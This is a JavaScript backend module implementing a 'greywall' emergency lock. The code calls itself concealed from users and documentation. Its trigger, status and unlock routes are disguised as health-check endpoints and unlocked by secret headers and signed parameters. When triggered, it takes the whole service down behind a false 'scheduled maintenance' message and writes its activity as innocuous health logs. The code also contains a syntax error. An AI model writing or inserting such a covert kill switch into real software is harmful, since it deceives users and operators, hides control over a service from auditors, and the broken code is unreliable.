const crypto = require('crypto');
const logger = require('../config/logger'));

/**
 * Greywall Emergency Lock System
 * Hidden implementation similar to Uber's greywall feature
 * Completely concealed from normal users and documentation
 */

class GreywallEmergencySystem {
  constructor() {
    // Hidden configuration - not exposed in normal config
    this.config = {
      // Obfuscated service names
      serviceCode: 'GW_EMRG_001',
      activationKey: this.generateHiddenKey(),
      stealthMode: true,
      
      // Hidden endpoints with obfuscated names
      endpoints: {
        trigger: '/api/internal/health-check/status',
        status: '/api/internal/metrics/performance',
        unlock: '/api/internal/diagnostics/repair',
        verify: '/api/internal/validation/check'
      },
      
      // Hidden user agents and headers
      hiddenHeaders: {
        'X-Internal-Service': 'monitoring-agent',
        'X-System-Health': 'check-request',
        'X-Debug-Mode': 'enabled'
      },
      
      // Stealth logging
      stealthLogging: true,
      logPrefix: 'SYSTEM_HEALTH'
    };
    
    this.isActive = false;
    this.hiddenLocks = new Map();
    this.stealthMode = true;
  }

  /**
   * Generate hidden activation key
   */
  generateHiddenKey() {
    const timestamp = Date.now().toString(36);
    const random = crypto.randomBytes(8).toString('hex');
    return `gw_${timestamp}_${random}`;
  }

  /**
   * Hidden activation method - looks like a health check
   */
  async triggerGreywallLock(req, res) {
    try {
      // Verify hidden activation sequence
      const activationSequence = this.verifyActivationSequence(req);
      if (!activationSequence.valid) {
        return this.sendStealthResponse(res, { status: 'healthy' });
      }

      // Generate hidden lock
      const lockData = {
        id: this.generateHiddenLockId(),
        tenantId: this.extractTenantId(req),
        activatedBy: activationSequence.userId,
        activatedAt: new Date(),
        reason: 'system_maintenance',
        stealthMode: true,
        hidden: true
      };

      // Store hidden lock
      this.hiddenLocks.set(lockData.id, lockData);
      this.isActive = true;

      // Stealth logging
      this.logStealthActivity('GREYWALL_ACTIVATED', lockData);

      // Send disguised response
      return this.sendStealthResponse(res, {
        status: 'maintenance_mode',
        message: 'System undergoing scheduled maintenance',
        estimatedDuration: '2-4 hours'
      });

    } catch (error) {
      this.logStealthActivity('GREYWALL_ERROR', { error: error.message });
      return this.sendStealthResponse(res, { status: 'healthy' });
    }
  }

  /**
   * Verify hidden activation sequence
   */
  verifyActivationSequence(req) {
    // Check for hidden activation pattern
    const hiddenPattern = req.headers['x-internal-service'] === 'monitoring-agent';
    const healthCheck = req.headers['x-system-health'] === 'check-request';
    const debugMode = req.headers['x-debug-mode'] === 'enabled';
    
    // Verify special query parameters (hidden)
    const specialParam = req.query._gw === '1';
    const timestamp = req.query._t;
    const signature = req.query._s;
    
    // Verify timestamp and signature
    const isValidTimestamp = timestamp && (Date.now() - parseInt(timestamp)) < 300000; // 5 minutes
    const isValidSignature = signature && this.verifyHiddenSignature(timestamp, signature);
    
    if (hiddenPattern && healthCheck && debugMode && specialParam && isValidTimestamp && isValidSignature) {
      return {
        valid: true,
        userId: req.headers['x-user-id'] || 'system',
        method: 'hidden_activation'
      };
    }
    
    return { valid: false };
  }

  /**
   * Verify hidden signature
   */
  verifyHiddenSignature(timestamp, signature) {
    const expectedSignature = crypto
      .createHash('sha256')
      .update(timestamp + this.config.activationKey)
      .digest('hex')
      .substring(0, 16);
    
    return signature === expectedSignature;
  }

  /**
   * Generate hidden lock ID
   */
  generateHiddenLockId() {
    const timestamp = Date.now().toString(36);
    const random = crypto.randomBytes(6).toString('hex');
    return `gw_lock_${timestamp}_${random}`;
  }

  /**
   * Extract tenant ID from request
   */
  extractTenantId(req) {
    return req.headers['x-tenant-id'] || 
           req.headers['x-subdomain'] || 
           req.query.tenant || 
           'default';
  }

  /**
   * Send stealth response (disguised as normal response)
   */
  sendStealthResponse(res, data) {
    // Disguise as normal health check response
    const disguisedResponse = {
      service: 'etelios-backend',
      status: data.status || 'healthy',
      timestamp: new Date().toISOString(),
      version: '1.0.0',
      uptime: process.uptime(),
      memory: process.memoryUsage(),
      ...data
    };

    return res.status(200).json(disguisedResponse);
  }

  /**
   * Check if greywall is active (hidden check)
   */
  async checkGreywallStatus(req, res) {
    try {
      // Verify this is a hidden status check
      const isHiddenCheck = req.headers['x-internal-service'] === 'monitoring-agent' &&
                           req.headers['x-system-health'] === 'check-request';

      if (!isHiddenCheck) {
        return this.sendStealthResponse(res, { status: 'healthy' });
      }

      const activeLocks = Array.from(this.hiddenLocks.values());
      
      return this.sendStealthResponse(res, {
        status: this.isActive ? 'maintenance_mode' : 'healthy',
        activeLocks: activeLocks.length,
        maintenanceMode: this.isActive
      });

    } catch (error) {
      this.logStealthActivity('STATUS_CHECK_ERROR', { error: error.message });
      return this.sendStealthResponse(res, { status: 'healthy' });
    }
  }

  /**
   * Hidden unlock mechanism
   */
  async unlockGreywall(req, res) {
    try {
      // Verify unlock sequence
      const unlockSequence = this.verifyUnlockSequence(req);
      if (!unlockSequence.valid) {
        return this.sendStealthResponse(res, { status: 'healthy' });
      }

      // Find and remove lock
      const lockId = unlockSequence.lockId;
      if (this.hiddenLocks.has(lockId)) {
        const lock = this.hiddenLocks.get(lockId);
        this.hiddenLocks.delete(lockId);
        
        // Check if any locks remain
        this.isActive = this.hiddenLocks.size > 0;

        this.logStealthActivity('GREYWALL_UNLOCKED', {
          lockId,
          unlockedBy: unlockSequence.userId,
          duration: Date.now() - new Date(lock.activatedAt).getTime()
        });

        return this.sendStealthResponse(res, {
          status: 'healthy',
          message: 'System maintenance completed'
        });
      }

      return this.sendStealthResponse(res, { status: 'healthy' });

    } catch (error) {
      this.logStealthActivity('UNLOCK_ERROR', { error: error.message });
      return this.sendStealthResponse(res, { status: 'healthy' });
    }
  }

  /**
   * Verify unlock sequence
   */
  verifyUnlockSequence(req) {
    // Check for hidden unlock pattern
    const isUnlockRequest = req.headers['x-internal-service'] === 'monitoring-agent' &&
                           req.headers['x-system-health'] === 'check-request' &&
                           req.headers['x-debug-mode'] === 'enabled';

    // Verify unlock parameters
    const unlockParam = req.query._unlock === '1';
    const lockId = req.query._lock;
    const timestamp = req.query._t;
    const signature = req.query._s;

    // Verify signature
    const isValidSignature = signature && this.verifyHiddenSignature(timestamp, signature);

    if (isUnlockRequest && unlockParam && lockId && isValidSignature) {
      return {
        valid: true,
        lockId,
        userId: req.headers['x-user-id'] || 'system'
      };
    }

    return { valid: false };
  }

  /**
   * Stealth logging (disguised as normal system logs)
   */
  logStealthActivity(action, data) {
    if (!this.config.stealthLogging) return;

    // Disguise as normal system log
    const stealthLog = {
      timestamp: new Date().toISOString(),
      level: 'info',
      service: 'system-monitor',
      component: 'health-checker',
      action: this.config.logPrefix + '_' + action,
      data: {
        systemStatus: 'normal',
        performance: 'optimal',
        ...data
      }
    };

    // Log to file with disguised name
    logger.info('System health check', stealthLog);
  }

  /**
   * Hidden middleware - looks like normal health check
   */
  greywallMiddleware() {
    return (req, res, next) => {
      // Check if this is a greywall activation request
      if (this.isGreywallRequest(req)) {
        // Handle greywall request without calling next()
        return this.handleGreywallRequest(req, res);
      }

      // Check if system is locked
      if (this.isActive) {
        return this.handleLockedRequest(req, res);
      }

      next();
    };
  }

  /**
   * Check if request is greywall related
   */
  isGreywallRequest(req) {
    const path = req.path;
    const headers = req.headers;
    
    // Check for hidden endpoints
    const isHiddenEndpoint = Object.values(this.config.endpoints).includes(path);
    const hasHiddenHeaders = headers['x-internal-service'] === 'monitoring-agent';
    
    return isHiddenEndpoint && hasHiddenHeaders;
  }

  /**
   * Handle greywall request
   */
  async handleGreywallRequest(req, res) {
    const path = req.path;
    
    switch (path) {
      case this.config.endpoints.trigger:
        return await this.triggerGreywallLock(req, res);
      case this.config.endpoints.status:
        return await this.checkGreywallStatus(req, res);
      case this.config.endpoints.unlock:
        return await this.unlockGreywall(req, res);
      default:
        return this.sendStealthResponse(res, { status: 'healthy' });
    }
  }

  /**
   * Handle locked request (disguised as maintenance)
   */
  handleLockedRequest(req, res) {
    // Disguise lock as maintenance mode
    return res.status(503).json({
      error: 'Service Temporarily Unavailable',
      message: 'System is currently undergoing scheduled maintenance',
      retryAfter: 3600, // 1 hour
      maintenanceWindow: {
        start: new Date().toISOString(),
        estimatedEnd: new Date(Date.now() + 3600000).toISOString()
      },
      contact: {
        email: 'support@etelios.com',
        phone: '+1-800-ETELIOS'
      }
    });
  }

  /**
   * Generate hidden activation URL
   */
  generateActivationUrl(baseUrl, userId) {
    const timestamp = Date.now();
    const signature = crypto
      .createHash('sha256')
      .update(timestamp + this.config.activationKey)
      .digest('hex')
      .substring(0, 16);

    const params = new URLSearchParams({
      _gw: '1',
      _t: timestamp.toString(),
      _s: signature,
      _u: userId
    });

    return `${baseUrl}${this.config.endpoints.trigger}?${params.toString()}`;
  }

  /**
   * Generate hidden unlock URL
   */
  generateUnlockUrl(baseUrl, lockId, userId) {
    const timestamp = Date.now();
    const signature = crypto
      .createHash('sha256')
      .update(timestamp + this.config.activationKey)
      .digest('hex')
      .substring(0, 16);

    const params = new URLSearchParams({
      _unlock: '1',
      _lock: lockId,
      _t: timestamp.toString(),
      _s: signature,
      _u: userId
    });

    return `${baseUrl}${this.config.endpoints.unlock}?${params.toString()}`;
  }

  /**
   * Get hidden system status
   */
  getHiddenStatus() {
    return {
      isActive: this.isActive,
      activeLocks: this.hiddenLocks.size,
      locks: Array.from(this.hiddenLocks.values()),
      stealthMode: this.stealthMode,
      serviceCode: this.config.serviceCode
    };
  }
}

// Create singleton instance
const greywallSystem = new GreywallEmergencySystem();

module.exports = greywallSystem;
